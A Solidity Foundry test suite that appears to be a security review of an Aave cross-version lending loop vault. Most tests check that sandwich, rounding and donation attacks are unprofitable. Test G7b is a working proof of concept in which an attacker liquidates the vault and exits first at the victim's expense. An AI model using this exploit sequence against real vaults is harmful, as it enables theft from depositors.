// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IStandardExchangeOut} from "@crane/contracts/interfaces/IStandardExchangeOut.sol";
import {IAaveOracle} from "@crane/contracts/protocols/lending/aave/v3.6/interfaces/IAaveOracle.sol";
import {AaveV36Service} from "contracts/protocols/lending/aave/cross-version/AaveV36Service.sol";
import {AaveV4Service} from "contracts/protocols/lending/aave/cross-version/AaveV4Service.sol";
import {AaveCrossVersionLoopE2E_Test} from
    "test/foundry/spec/protocol/lending/aave/cross-version/AaveCrossVersionLoopE2E.t.sol";

interface IRebal {
    function rebalance() external;
    function forceRepay() external;
    function previewNetCarry() external view returns (int256);
}

interface ISetPrice {
    function setPrice(uint256 price) external;
}

interface IV4OracleSrc {
    function getReserveSource(uint256 reserveId) external view returns (address);
}

/// gx-aave-cross-version-loop: adversarial execution against the registry-deployed loop diamond.
contract GxAaveLoopAdversarial_Test is AaveCrossVersionLoopE2E_Test {
    address internal alice = address(0xA11CE);
    address internal bob = address(0xB0B);
    address internal attacker = address(0xBAD);
    address internal keeper = address(0xCEE9);
    address internal v4borrower = address(0x4099);

    // ---------------------------------------------------------------- helpers
    function _setup() internal {
        _deployVaultThroughRegistry();
        _seedBorrowLiquidity();
        // extra passive V4 tokenA lenders so third-party utilization spikes leave room for deposits
        _mint(tokenA, v4lp, 5_000e18);
        vm.startPrank(v4lp);
        tokenA.approve(address(v4Spoke), 5_000e18);
        v4Spoke.supply(v4ReserveIdA, 5_000e18, v4lp);
        vm.stopPrank();
    }

    function _dep(address who, uint256 amt) internal returns (uint256 sh) {
        _mint(tokenA, who, amt);
        vm.startPrank(who);
        tokenA.approve(vault, amt);(sh,) = IStandardExchangeIn(vault).exchangeIn(tokenA, amt, IERC20(vault), 0, who, false, block.timestamp);
        vm.stopPrank();
    }

    function _redeem(address who, uint256 sh) internal returns (uint256 out) {
        vm.prank(who);(out,) = IStandardExchangeIn(vault).exchangeIn(IERC20(vault), sh, tokenA, 0, who, false, block.timestamp);
    }

    function _redeemAll(address who) internal returns (uint256) {
        return _redeem(who, IERC20(vault).balanceOf(who));
    }

    function _valueOf(address who) internal view returns (uint256) {
        uint256 sh = IERC20(vault).balanceOf(who);
        if (sh == 0) return 0;(uint256 quotedAmountOut,) = IStandardExchangeIn(vault).previewExchangeIn(IERC20(vault), sh, tokenA);
        return quotedAmountOut;
    }

    /// reported NAV in USD(1e8) = exchangeRate * supply / 1e18
    function _navReported() internal view returns (uint256) {
        (bool ok, bytes memory r) = vault.staticcall(abi.encodeWithSignature("exchangeRate()"));
        require(ok, "rate");
        return abi.decode(r, (uint256)) * IERC20(vault).totalSupply() / 1e18;
    }

    /// signed true NAV in USD(1e8): netA(all) + local A + raw B + signed netB
    function _navTrue() internal view returns (int256) {
        uint256 pA = IAaveOracle(v36Oracle).getAssetPrice(address(tokenA));
        uint256 pB = IAaveOracle(v36Oracle).getAssetPrice(address(tokenB));
        int256 a = int256(AaveV36Service.suppliedOf(v36Pool, address(tokenA), vault)
            + AaveV4Service.suppliedOf(v4Spoke, v4ReserveIdA, vault) + tokenA.balanceOf(vault))
            - int256(AaveV36Service.debtOf(v36Pool, address(tokenA), vault) + AaveV4Service.debtOf(v4Spoke, v4ReserveIdA, vault));
        int256 b = int256(AaveV36Service.suppliedOf(v36Pool, address(tokenB), vault)
            + AaveV4Service.suppliedOf(v4Spoke, v4ReserveIdB, vault) + tokenB.balanceOf(vault))
            - int256(AaveV36Service.debtOf(v36Pool, address(tokenB), vault) + AaveV4Service.debtOf(v4Spoke, v4ReserveIdB, vault));
        return a * int256(pA) / 1e18 + b * int256(pB) / 1e6;
    }

    function _logState(string memory tag) internal {
        emit log_string(tag);
        emit log_named_uint("  navReported(1e8)", _navReported());
        emit log_named_int("  navTrue(1e8)", _navTrue());
        emit log_named_uint("  rawA", tokenA.balanceOf(vault));
        emit log_named_uint("  rawB", tokenB.balanceOf(vault));
        emit log_named_uint("  v3 sA", AaveV36Service.suppliedOf(v36Pool, address(tokenA), vault));
        emit log_named_uint("  v3 dB", AaveV36Service.debtOf(v36Pool, address(tokenB), vault));
        emit log_named_uint("  v4 sB", AaveV4Service.suppliedOf(v4Spoke, v4ReserveIdB, vault));
        emit log_named_uint("  v4 dA", AaveV4Service.debtOf(v4Spoke, v4ReserveIdA, vault));
        emit log_named_uint("  HF v3", AaveV36Service.healthFactor(v36Pool, vault));
        emit log_named_uint("  HF v4", AaveV4Service.healthFactor(v4Spoke, vault));
    }

    /// third party spikes V4 tokenA utilization so carry turns negative (same as repo Rebalance test).
    function _spikeV4ABorrow() internal {
        _mint(tokenB, v4borrower, 6_000_000e6);
        vm.startPrank(v4borrower);
        tokenB.approve(address(v4Spoke), 6_000_000e6);
        v4Spoke.supply(v4ReserveIdB, 6_000_000e6, v4borrower);
        v4Spoke.setUsingAsCollateral(v4ReserveIdB, true, v4borrower);
        v4Spoke.borrow(v4ReserveIdA, 1_800e18, v4borrower);
        vm.stopPrank();
    }

    /// market price move of tokenA on BOTH venues' oracles (environment event, not attacker action).
    function _movePriceA(uint256 p) internal {
        ISetPrice(IAaveOracle(v36Oracle).getSourceOfAsset(address(tokenA))).setPrice(p);
        ISetPrice(IV4OracleSrc(address(v4Oracle)).getReserveSource(v4ReserveIdA)).setPrice(p);
    }

    // ---------------------------------------------------------------- G1 round trip
    function test_G1_roundTrip_exactIn_noProfit_victimUnharmed() public {
        _setup();
        _dep(alice, 50e18);
        uint256 aliceBefore = _valueOf(alice);
        uint256 inA = 100e18;
        uint256 sh = _dep(attacker, inA);
        uint256 out = _redeem(attacker, sh);
        emit log_named_uint("attacker in", inA);
        emit log_named_uint("attacker out", out);
        emit log_named_uint("alice value before", aliceBefore);
        emit log_named_uint("alice value after", _valueOf(alice));
        assertLe(out, inA, "no round-trip profit");
        assertGe(_valueOf(alice) + 2, aliceBefore, "victim not diluted");
    }

    // ---------------------------------------------------------------- G2 wrap exact-out then redeem
    function test_G2_mintExactShares_thenRedeem_noProfit() public {
        _setup();
        _dep(alice, 50e18);
        uint256 aliceBefore = _valueOf(alice);(uint256 wantShares,) = IStandardExchangeIn(vault).previewExchangeIn(tokenA, 30e18, IERC20(vault));
        uint256 cost = IStandardExchangeOut(vault).previewExchangeOut(tokenA, IERC20(vault), wantShares);
        _mint(tokenA, attacker, cost);
        vm.startPrank(attacker);
        tokenA.approve(vault, cost);
        uint256 paid = IStandardExchangeOut(vault).exchangeOut(tokenA, cost, IERC20(vault), wantShares, attacker, false, block.timestamp);
        vm.stopPrank();
        assertEq(IERC20(vault).balanceOf(attacker), wantShares, "exact shares");
        uint256 out = _redeemAll(attacker);
        emit log_named_uint("paid", paid);
        emit log_named_uint("out", out);
        assertLe(out, paid, "no mint/redeem profit");
        assertGe(_valueOf(alice) + 2, aliceBefore, "victim not diluted");
    }

    // ---------------------------------------------------------------- G3 dust exact-out rounding loop
    function test_G3_dustExactOutLoop_noProfit() public {
        _setup();
        _dep(alice, 50e18);
        uint256 aliceBefore = _valueOf(alice);
        uint256 inA = 10e18;
        _dep(attacker, inA);
        uint256 got;
        uint256 sharesSpent;
        uint256[5] memory sizes = [uint256(1), 7, 999, 1e6, 123456789];
        for (uint256 i; i < 40; ++i) {
            uint256 amt = sizes[i % 5];
            uint256 b0 = IERC20(vault).balanceOf(attacker);
            vm.prank(attacker);
            uint256 used = IStandardExchangeOut(vault).exchangeOut(IERC20(vault), type(uint256).max, tokenA, amt, attacker, false, block.timestamp);
            assertGt(used, 0, "positive out must burn shares");
            assertEq(b0 - IERC20(vault).balanceOf(attacker), used);
            sharesSpent += used;
            got += amt;
        }
        got += _redeemAll(attacker);
        emit log_named_uint("shares spent on dust", sharesSpent);
        emit log_named_uint("attacker total out", got);
        assertLe(got, inA, "no dust rounding profit");
        assertGe(_valueOf(alice) + 2, aliceBefore, "victim not diluted");
    }

    // ---------------------------------------------------------------- G4 rebalance de-risk sandwich
    function test_G4_rebalanceDerisk_sandwich_noProfit() public {
        _setup();
        _dep(alice, 100e18);
        _spikeV4ABorrow();
        vm.warp(block.timestamp + 2 hours);
        assertLt(IRebal(vault).previewNetCarry(), 0, "negative carry -> de-risk branch");
        uint256 aliceBefore = _valueOf(alice);
        uint256 inA = 200e18;
        // front-run
        uint256 sh = _dep(attacker, inA);
        _logState("pre-rebalance");
        uint256 nav0 = _navReported();
        vm.prank(attacker);
        IRebal(vault).rebalance();
        _logState("post-rebalance");
        uint256 nav1 = _navReported();
        emit log_named_int("nav step (1e8)", int256(nav1) - int256(nav0));
        // back-run: small exit (re-supplies any raw B via proportionalUnwind) then large exit
        uint256 out = _redeem(attacker, sh / 100);
        out += _redeemAll(attacker);
        emit log_named_uint("attacker in", inA);
        emit log_named_uint("attacker out", out);
        emit log_named_uint("alice before", aliceBefore);
        emit log_named_uint("alice after", _valueOf(alice));
        assertLe(out, inA, "no rebalance sandwich profit");
    }

    function test_G4b_rebalanceThenCheapDeposit_smallExit_largeExit() public {
        _setup();
        _dep(alice, 100e18);
        _spikeV4ABorrow();
        vm.warp(block.timestamp + 2 hours);
        vm.prank(attacker);
        IRebal(vault).rebalance();
        _logState("after rebalance");
        uint256 inA = 200e18;
        uint256 sh = _dep(attacker, inA);
        uint256 out = _redeem(attacker, sh / 100);
        _logState("after small exit");
        out += _redeemAll(attacker);
        emit log_named_uint("attacker in", inA);
        emit log_named_uint("attacker out", out);
        assertLe(out, inA, "no post-rebalance sandwich profit");
    }

    // ---------------------------------------------------------------- G5 repeated rebalances -> fullUnwind tail strands raw B
    function test_G5_repeatedRebalance_tailStrandsRawB_sandwich() public {
        _setup();
        _dep(alice, 100e18);
        _spikeV4ABorrow();
        uint256 n;
        for (; n < 120; ++n) {
            vm.warp(block.timestamp + 1 hours + 1);
            vm.prank(keeper);
            IRebal(vault).rebalance();
            if (AaveV4Service.debtOf(v4Spoke, v4ReserveIdA, vault) == 0
                && AaveV36Service.debtOf(v36Pool, address(tokenB), vault) == 0) break;
        }
        emit log_named_uint("rebalances", n);
        _logState("after repeated de-risk");
        uint256 rawB = tokenB.balanceOf(vault);
        int256 gap = _navTrue() - int256(_navReported());
        emit log_named_int("navTrue - navReported (1e8)", gap);
        uint256 aliceBefore = _valueOf(alice);
        uint256 inA = 300e18;
        uint256 sh = _dep(attacker, inA);
        _logState("after attacker deposit");
        uint256 out = _redeem(attacker, sh / 100);
        _logState("after small exit");
        out += _redeemAll(attacker);
        emit log_named_uint("rawB stranded", rawB);
        emit log_named_uint("attacker in", inA);
        emit log_named_uint("attacker out", out);
        emit log_named_uint("alice before", aliceBefore);
        emit log_named_uint("alice after", _valueOf(alice));
        assertLe(out, inA + 1e9, "no stranded-B sandwich profit beyond rounding dust (1e9 wei A)");
    }

    // ---------------------------------------------------------------- G6 forceRepay effectiveness at risk
    function test_G6_forceRepay_priceDown_derisksV3() public {
        _setup();
        _dep(alice, 100e18);
        _logState("start");
        // tokenA falls until V3 HF < 1.05 (forceRepay gate)
        uint256 p = 2000e8;
        while (AaveV36Service.healthFactor(v36Pool, vault) >= 1.05e18) { p = p * 99 / 100; _movePriceA(p); }
        _logState("at risk");
        uint256 hf0 = AaveV36Service.healthFactor(v36Pool, vault);
        uint256 nav0 = _navReported();
        vm.prank(keeper);
        IRebal(vault).forceRepay();
        _logState("after forceRepay");
        assertGt(AaveV36Service.healthFactor(v36Pool, vault), hf0, "forceRepay must raise V3 HF");
        assertApproxEqRel(_navReported(), nav0, 1e15, "no NAV step from forceRepay");
    }

    function test_G6b_forceRepay_priceUp_derisksV4() public {
        _setup();
        _dep(alice, 100e18);
        uint256 p = 2000e8;
        while (AaveV4Service.healthFactor(v4Spoke, vault) >= 1.05e18) { p = p * 101 / 100; _movePriceA(p); }
        _logState("at risk v4");
        uint256 hf0 = AaveV4Service.healthFactor(v4Spoke, vault);
        vm.prank(keeper);
        IRebal(vault).forceRepay();
        _logState("after forceRepay");
        assertGt(AaveV4Service.healthFactor(v4Spoke, vault), hf0, "forceRepay must raise V4 HF");
    }

    function redeemAllExt(address who) external returns (uint256) {
        return _redeemAll(who);
    }

    function redeemExt(address who, uint256 sh) external returns (uint256) {
        return _redeem(who, sh);
    }

    // ---------------------------------------------------------------- G9 V3 liquidation -> positive netB -> de-risk strands raw B -> sandwich
    /// Market event: tokenA drops, V3 position is liquidated (liquidator repays tokenB debt, seizes tokenA),
    /// leaving V4 tokenB supply > V3 tokenB debt (positive netB, counted in NAV). A later permissionless
    /// de-risk (rebalance) withdraws the V4 tokenB and strands it raw (excluded from NAV), then a small
    /// exit's proportionalUnwind re-supplies it. Attacker: deposit after the step, small exit, large exit.
    function test_G9_v3Liquidation_strandedB_sandwich() public {
        _setup();
        _dep(alice, 100e18);
        uint256 p = 2000e8;
        while (AaveV36Service.healthFactor(v36Pool, vault) >= 0.97e18) { p = p * 99 / 100; _movePriceA(p); }
        _logState("liquidatable v3");
        // liquidator (unprivileged): repay tokenB debt, receive tokenA collateral
        {
            uint256 cover = AaveV36Service.debtOf(v36Pool, address(tokenB), vault);
            _mint(tokenB, keeper, cover);
            vm.startPrank(keeper);
            tokenB.approve(address(v36Pool), cover);
            v36Pool.liquidationCall(address(tokenA), address(tokenB), vault, cover, false);
            vm.stopPrank();
        }
        _logState("post v3 liquidation");
        // permissionless de-risk steps by anyone until tokenB is stranded raw
        for (uint256 i; i < 50; ++i) {
            vm.warp(block.timestamp + 1 hours + 1);
            try IRebal(vault).forceRepay() {} catch { vm.prank(keeper); IRebal(vault).rebalance(); }
            if (tokenB.balanceOf(vault) > 0 && AaveV4Service.suppliedOf(v4Spoke, v4ReserveIdB, vault) == 0) break;
        }
        _logState("after de-risk");
        uint256 aliceBefore = _valueOf(alice);
        uint256 navTrueBefore = uint256(_navTrue());
        uint256 inA = 300e18;
        uint256 sh = _dep(attacker, inA);
        _logState("after attacker deposit");
        uint256 out = _redeem(attacker, sh / 100);
        _logState("after small exit");
        out += _redeemAll(attacker);
        uint256 aliceAfter = _valueOf(alice);
        emit log_named_uint("navTrue before attack", navTrueBefore);
        emit log_named_uint("attacker in", inA);
        emit log_named_uint("attacker out", out);
        emit log_named_int("attacker profit (A wei)", int256(out) - int256(inA));
        emit log_named_uint("alice value before", aliceBefore);
        emit log_named_uint("alice value after", aliceAfter);
        assertLe(out, inA + 1e9, "no stranded-B sandwich profit beyond rounding dust (1e9 wei A)");
    }

    // ---------------------------------------------------------------- G8 donation of raw tokenB then resupply (donor-loss check)
    function test_G8_rawBDonation_capture_unprofitable() public {
        _setup();
        _dep(alice, 100e18);
        uint256 donate = 50_000e6;
        _mint(tokenB, attacker, donate);
        vm.prank(attacker);
        tokenB.transfer(vault, donate);
        uint256 navBefore = _navReported();
        uint256 inA = 300e18;
        uint256 sh = _dep(attacker, inA);
        uint256 out = _redeem(attacker, sh / 100);
        emit log_named_int("nav jump after small exit resupply", int256(_navReported()) - int256(navBefore));
        out += _redeemAll(attacker);
        // attacker spent inA (USD 2000 each) + donate (USD 1 each)
        uint256 spentUsd = inA * 2000 / 1e18 * 1e8 + donate * 1e8 / 1e6;
        uint256 gotUsd = out * 2000 / 1e18 * 1e8;
        emit log_named_uint("spentUsd", spentUsd);
        emit log_named_uint("gotUsd", gotUsd);
        assertLe(gotUsd, spentUsd, "donation capture unprofitable");
    }

    // ---------------------------------------------------------------- shared: unstick + full exit with keeper de-risk between tries
    function _exitWithKeeper(address who) internal returns (uint256 got) {
        for (uint256 i; i < 60 && IERC20(vault).balanceOf(who) > 0; ++i) {
            try this.redeemAllExt(who) returns (uint256 o) { got += o; break; } catch {}
            // fall back to chunked exits (halves) as far as the vault allows this round
            for (uint256 j; j < 30 && IERC20(vault).balanceOf(who) > 1; ++j) {
                try this.redeemExt(who, IERC20(vault).balanceOf(who) / 2) returns (uint256 o) { got += o; } catch { break; }
            }
            vm.warp(block.timestamp + 1 hours + 1);
            try IRebal(vault).forceRepay() {} catch { vm.prank(keeper); try IRebal(vault).rebalance() {} catch {} }
        }
    }

    function _usdOfB() internal view returns (uint256) {
        uint256 b = AaveV4Service.suppliedOf(v4Spoke, v4ReserveIdB, vault) + tokenB.balanceOf(vault);
        uint256 d = AaveV36Service.debtOf(v36Pool, address(tokenB), vault);
        return b > d ? (b - d) * IAaveOracle(v36Oracle).getAssetPrice(address(tokenB)) / 1e6 : 0;
    }

    // ---------------------------------------------------------------- G7b PoC: attacker = existing holder + V4 liquidator exits first on floored NAV
    function test_G7b_PoC_v4Liquidation_firstExiterOverpaid_victimLoss() public {
        _setup();
        _dep(alice, 100e18);          // honest victim first
        _dep(attacker, 100e18);       // attacker is an ordinary holder
        // market: tokenA rallies; no keeper calls forceRepay inside the 1.05 -> 1.00 window
        uint256 p = 2000e8;
        while (AaveV4Service.healthFactor(v4Spoke, vault) >= 0.97e18) { p = p * 101 / 100; _movePriceA(p); }
        uint256 pA = IAaveOracle(v36Oracle).getAssetPrice(address(tokenA));
        uint256 trueBefore = uint256(_navTrue());
        uint256 fairEachA = trueBefore * 1e18 / 2 / pA; // fair claim of each 50% holder, pre-liquidation
        // attack tx (unprivileged): liquidate the vault on V4, then exit first
        uint256 cover = AaveV4Service.debtOf(v4Spoke, v4ReserveIdA, vault);
        _mint(tokenA, attacker, cover);
        uint256 aBal0 = tokenA.balanceOf(attacker);
        uint256 bBal0 = tokenB.balanceOf(attacker);
        vm.startPrank(attacker);
        tokenA.approve(address(v4Spoke), cover);
        v4Spoke.liquidationCall(v4ReserveIdB, v4ReserveIdA, vault, cover, false);
        vm.stopPrank();
        emit log_named_int("post-liq navTrue - navReported (USD 1e8)", _navTrue() - int256(_navReported()));
        // reviewer: fair claim AFTER the liquidation (liquidation penalty is a market loss, not the bug)
        uint256 fairPostEachA = uint256(_navTrue()) * 1e18 / 2 / pA;
        emit log_named_uint("fair claim each holder post-liq (A)", fairPostEachA);
        uint256 sharesOut = _redeemAll(attacker);
        // attacker net in USD at fair oracle price: (A received from exit - A spent on liquidation + A unspent) + B seized
        int256 liqLegUsd = int256((tokenB.balanceOf(attacker) - bBal0) * 1e8 / 1e6)
            - int256((aBal0 - (tokenA.balanceOf(attacker) - sharesOut)) * pA / 1e18);
        int256 exitExcessUsd = (int256(sharesOut) - int256(fairEachA)) * int256(pA) / 1e18;
        emit log_named_uint("fair claim each holder (A)", fairEachA);
        emit log_named_uint("attacker exit received (A)", sharesOut);
        emit log_named_int("attacker exit excess vs fair (USD 1e8)", exitExcessUsd);
        emit log_named_int("attacker liquidation leg pnl (USD 1e8)", liqLegUsd);
        // victim exits (keeper de-risk allowed between tries)
        uint256 aliceOut = _exitWithKeeper(alice);
        emit log_named_uint("alice received (A)", aliceOut);
        emit log_named_uint("alice shares left", IERC20(vault).balanceOf(alice));
        emit log_named_int("alice loss vs fair (A)", int256(fairEachA) - int256(aliceOut));
        emit log_named_int("alice loss vs fair (USD 1e8)", (int256(fairEachA) - int256(aliceOut)) * int256(pA) / 1e18);
        _logState("after victim exit attempts");
        assertGt(sharesOut, fairEachA * 110 / 100, "attacker exit overpaid >10% vs fair");
        assertLt(aliceOut, fairEachA * 90 / 100, "victim underpaid >10% vs fair");
        assertGt(exitExcessUsd + liqLegUsd, 0, "attacker net profit at fair price");
        // reviewer: same conclusions hold against the post-liquidation fair claim
        emit log_named_int("attacker exit excess vs post-liq fair (USD 1e8)", (int256(sharesOut) - int256(fairPostEachA)) * int256(pA) / 1e18);
        emit log_named_int("alice loss vs post-liq fair (USD 1e8)", (int256(fairPostEachA) - int256(aliceOut)) * int256(pA) / 1e18);
        emit log_named_int("value left in vault (true, USD 1e8)", _navTrue());
        assertGt(sharesOut, fairPostEachA * 110 / 100, "attacker overpaid >10% vs post-liq fair");
        assertLt(aliceOut, fairPostEachA * 90 / 100, "victim underpaid >10% vs post-liq fair");
    }

    // ---------------------------------------------------------------- G10 V3 liquidation -> positive netB is undeliverable (locked)
    function test_G10_v3Liquidation_positiveNetB_lockedForAllHolders() public {
        _setup();
        _dep(alice, 100e18);
        _dep(bob, 100e18);
        uint256 p = 2000e8;
        while (AaveV36Service.healthFactor(v36Pool, vault) >= 0.97e18) { p = p * 99 / 100; _movePriceA(p); }
        uint256 cover = AaveV36Service.debtOf(v36Pool, address(tokenB), vault);
        _mint(tokenB, keeper, cover);
        vm.startPrank(keeper);
        tokenB.approve(address(v36Pool), cover);
        v36Pool.liquidationCall(address(tokenA), address(tokenB), vault, cover, false);
        vm.stopPrank();
        uint256 pA = IAaveOracle(v36Oracle).getAssetPrice(address(tokenA));
        uint256 trueNav = uint256(_navTrue());
        emit log_named_uint("navTrue after liquidation (USD 1e8)", trueNav);
        emit log_named_uint("netB value (USD 1e8)", _usdOfB());
        uint256 aOut = _exitWithKeeper(alice);
        uint256 bOut = _exitWithKeeper(bob);
        _logState("after both holders exit");
        uint256 paidUsd = (aOut + bOut) * pA / 1e18;
        emit log_named_uint("alice out (A)", aOut);
        emit log_named_uint("bob out (A)", bOut);
        emit log_named_uint("holders paid total (USD 1e8)", paidUsd);
        emit log_named_uint("value left in vault (USD 1e8)", uint256(_navTrue()));
        emit log_named_uint("supply left", IERC20(vault).totalSupply());
        assertEq(IERC20(vault).balanceOf(alice) + IERC20(vault).balanceOf(bob), 0, "both fully exited");
        emit log_named_uint("holders realized % of true NAV", paidUsd * 100 / trueNav);
        // PoC assertion: more than half of the holders' true post-liquidation value is permanently undeliverable
        assertLt(paidUsd * 2, trueNav, "holders realize < 50% of true NAV (positive netB locked)");
    }
}
